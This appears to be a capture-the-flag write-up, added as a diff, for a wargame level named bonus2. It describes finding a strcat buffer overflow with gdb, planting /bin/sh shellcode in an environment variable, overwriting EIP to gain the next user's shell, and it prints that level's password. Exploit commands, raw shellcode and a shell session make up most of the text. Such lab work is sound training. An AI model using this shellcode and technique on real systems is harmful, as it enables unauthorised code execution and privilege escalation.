@@ -1,0 +1,55 @@
+The binary takes 2 arguments.
+Depending on the LANG environment variable, the program will output "Hello" either in nl, fi or en.
+A call to strcat is then made to print Hello and the first argument provided.
+The second argument is also used to increase the buffer.
+
+Let's find where to overflow first :
+gdb --args bonus2 $(python -c 'print "A" * 40 + " " + "B" * 32')
+Starting program: /home/user/bonus2/bonus2 AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA BBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBB
+Hello AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBB
+Program received signal SIGSEGV, Segmentation fault.
+0x08004242 in ?? ()
+
+The second argument causes the overflow at offset 32 but we notice it only re-writes the last 4 bytes of eip.
+
+Let's run it with a bigger buffer by setting the LANG value to nl (fi would work as well).
+LANG="nl"
+
+Run again.
+gdb --args bonus2 $(python -c 'print "A" * 40 + " " + "B" * 32')
+r
+Starting program: /home/user/bonus2/bonus2 AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA BBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBB
+Goedemiddag! AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBB
+
+Program received signal SIGSEGV, Segmentation fault.
+0x42424242 in ?? ()
+
+Eip has correctly been replaced.
+
+Next step is to use the same shellcode as in previous exercices to run /bin/sh.
+
+export SHELLCODE=$(python -c "print '\x90'*40 + '\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80'")
+
+This time, let's use a program to find our shellcode's address.
+
+/*
+#include <stdlib.h>
+#include <stdio.h>
+
+int main(int argc, char *argv[]) {
+    printf("%s => %p\n", argv[1], getenv(argv[1]));
+    return 0;
+}
+*/
+
+gcc -o get_address getadr.c 
+./get_address SHELLCODE
+SHELLCODE => 0xbffff8d8
+
+Convert to little endian, 0xbffff8d8 = \xd8\xf8\xff\xbf
+./bonus2 $(python -c "print 'A' * 40 + ' ' + 'B' * 23 + '\xd8\xf8\xff\xbf'")
+Goedemiddag! AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBBBBBBBBBBBBBBBBBBBBB����
+$ whoami
+bonus3
+cat /home/user/bonus3/.pass
+71d449df0f960b36e0055eb58c14d0f5d0ddc0b35328d657f91cf0df15910587
